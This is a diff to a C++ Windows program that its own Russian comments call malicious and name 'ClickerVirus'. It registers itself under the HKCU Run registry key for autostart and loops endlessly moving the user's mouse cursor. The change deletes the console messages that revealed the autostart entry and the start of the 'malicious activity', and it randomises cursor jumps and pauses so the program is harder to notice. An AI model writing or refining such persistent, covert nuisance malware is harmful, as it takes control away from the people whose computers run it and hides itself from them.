@@ -1,12 +1,17 @@
 #include <iostream>
 #include <Windows.h>
 #include <string>
+#include <random>
+#include <chrono>
 
 // Добавление в автозагрузку
 void AddToStartup();
 
 // Основная вредоносная активность
 void MaliciousActivity();
+
+// Генерация случайного числа
+int getRandomNumber(int min, int max);
 
 int main()
 {
@@ -61,24 +66,11 @@ void AddToStartup()
 
 		// Закрытие ключа
 		RegCloseKey(hKey);
-
-		// Выводим данные о успешном добавлении в автозагрузку
-		std::cout << "[+] Успешно добавлено в автозагрузку!" << std::endl;
-		std::cout << "    Имя в реестре: ClickerVirus" << std::endl;
-		std::cout << "    Путь: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" << std::endl;
-	}
-	// Если не удалось открыть ключ
-	else
-	{
-		std::cout << "[-] Ошибка открытия ключа реестра. Код: " << result << std::endl;
 	}
 }
 
 void MaliciousActivity()
 {
-	std::cout << "[*] Вредоносная активность запущена!" << std::endl;
-	std::cout << std::endl;
-
 	// Бесконечный цикл
 	// Программа будет работать пока её не убьют
 	while (true)
@@ -87,8 +79,17 @@ void MaliciousActivity()
 		POINT cursorPos;
 		GetCursorPos(&cursorPos);
 
-		// Немного двигаем курсор
-		SetCursorPos(cursorPos.x + 10, cursorPos.y + 10);
+		// Двигаем курсор на случайную позицию
+		if (getRandomNumber(1, 2) == 1)
+		{
+			SetCursorPos(cursorPos.x + getRandomNumber(2, 100),
+				cursorPos.y + getRandomNumber(5, 100));
+		}
+		else
+		{
+			SetCursorPos(cursorPos.x - getRandomNumber(2, 100),
+				cursorPos.y - getRandomNumber(5, 100));
+		}
 
 		// Небольшая пауза
 		Sleep(100);
@@ -103,6 +104,19 @@ void MaliciousActivity()
 		// Возвращаем курсор обратно
 		SetCursorPos(cursorPos.x, cursorPos.y);
 
-		Sleep(500);
+		// Программа засыпает на случайное время
+		Sleep(getRandomNumber(250, 1500));
 	}
+}
+
+int getRandomNumber(int min, int max)
+{
+	// Инициализация генератора случайных чисел
+	static std::mt19937 generator(std::chrono::steady_clock::now().time_since_epoch().count());
+
+	// Создание распределения в заданном диапазоне
+	std::uniform_int_distribution<int> distribution(min, max);
+
+	// Генерация и возврат случайного числа
+	return distribution(generator);
 }
